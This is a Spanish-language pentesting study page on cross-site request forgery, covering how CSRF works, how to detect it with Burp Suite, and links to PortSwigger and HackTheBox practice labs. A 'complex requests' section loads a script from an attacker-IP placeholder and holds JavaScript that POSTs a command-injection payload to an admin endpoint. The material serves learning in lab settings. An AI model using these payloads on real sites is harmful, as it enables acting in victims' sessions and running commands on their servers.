---
description: Cross-Site-Request-Forgery
---

# CSRF

## Introducción

Es una vulnerabilidad que aprovecha que el usuario tenga una sesión abierta en un sitio web vulnerable para realizar tareas en su nombre sin su consentimiento. Por ejemplo, entrarías en una página controlada por un atacante que enviaría de forma silenciosa sin que lo veas una petición de cambio de contraseña a otra web en la que tienes una sesión ya iniciada.

Esto también puede ocurrir desde la misma web, por ejemplo alguien explota un [XSS](xss.md) dentro de un foro que hace que todo el que vea un comentario cambie su contraseña por otra. O haga algún tipo de petición dentro de esa misma web.

## ¿Cómo lo detectamos?

Tenemos que ver cada tarea que se puede realizar en la web e intentar replicarla desde otro sitio. Por ejemplo podríamos tener nuestro propio server-exploit en el que hacemos peticiones ya sean GET o POST replicando aquellas que ya hemos interceptado y estudiado por ejemplo con Burpsuite.

Tenéis ejemplos de esto en [CSRF de portswigger](../../../portswigger/cross-site-request-forgery-labs.md).

Consejos:

* Comprobad todas y cada una de las peticiones que se realizan en la web
* Probad a hacer cambios en el propio Burpsuite a las peticiones, quitad algunas cabeceras, modificad otras, añadir... Y por último comprobad la respuesta que da cada uno de estos posibles cambios.
* Unid unas vulnerabilidades a otras, quizás podéis incluir cabeceras desde un servidor externo por otra vulnerabilidad existente en la web... Ejemplo en [Portswigger](../../../portswigger/cross-site-request-forgery-labs.md#csrf-where-token-is-tied-to-non-session-cookie)
* Puede ser que no se pueda explotar a través de otro servidor pero si a través de un XSS en la misma web. Ejemplo en [Portswigger](../../../portswigger/cross-site-scripting-labs.md#exploiting-cross-site-scripting-to-steal-cookies)

## Payloads

Puedes utilizar los [payloads de XSS](xss.md)

## Peticiones complejas

Podemos montar y crear peticiones más complejas para aprovecharnos de un CSRF cargando directamente un archivo, por ejemplo un javascript.

```
#Primero envíamos nuestro script
<script src="http://<ipatacante>/codigomalicioso.js"></script>
```

A continuación montamos el archivo con la petición:

```javascript
#Creamos la petición
var request = new XMLHttpRequest();
#En este caso queríamos aprovechar una ejecución remota de comandos enviando
#los parámetros por POST
params = 'cmd=dir | powershell -c "ping -n 1 10.10.14.66"';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
#Podemos montar toda nuestra petición parte por parte
request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
#La enviamos
request.send(params);
```

## Practicar

* Máquinas "[CSRF](../../../portswigger/cross-site-request-forgery-labs.md)" de Portswigger \[Acceso 18/11/2021]
* Máquina "BankRobber" de HTB \[Acceso 03/02/2022]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
